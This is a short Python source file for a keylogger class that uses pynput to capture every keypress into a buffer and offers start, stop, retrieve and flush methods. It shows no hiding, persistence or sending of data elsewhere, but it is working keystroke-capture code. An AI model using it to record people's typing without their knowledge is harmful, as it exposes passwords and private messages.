from interfaceManager import *
from buffer import *
from typing import List
from pynput import keyboard

class KeyLoggerService(IKeyLogger):
    __buffer = Buffer()
    __is_logging = False

    def __init__(self):
        self.listener = None

    def start_logging(self) -> None:
        self.__is_logging = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self) -> None:
        self.__is_logging = False
        self.listener.stop()

    def get_logged_keys(self) -> List[str]:
        return self.__buffer.get_data()

    def flush(self) -> None:
        self.__buffer.flush()

    def get_is_logging(self) -> bool:
        return self.__is_logging

    def on_press(self, key):
        try:
            self.__buffer.add_data(key.char)
        except AttributeError:
            self.__buffer.add_data(str(key))

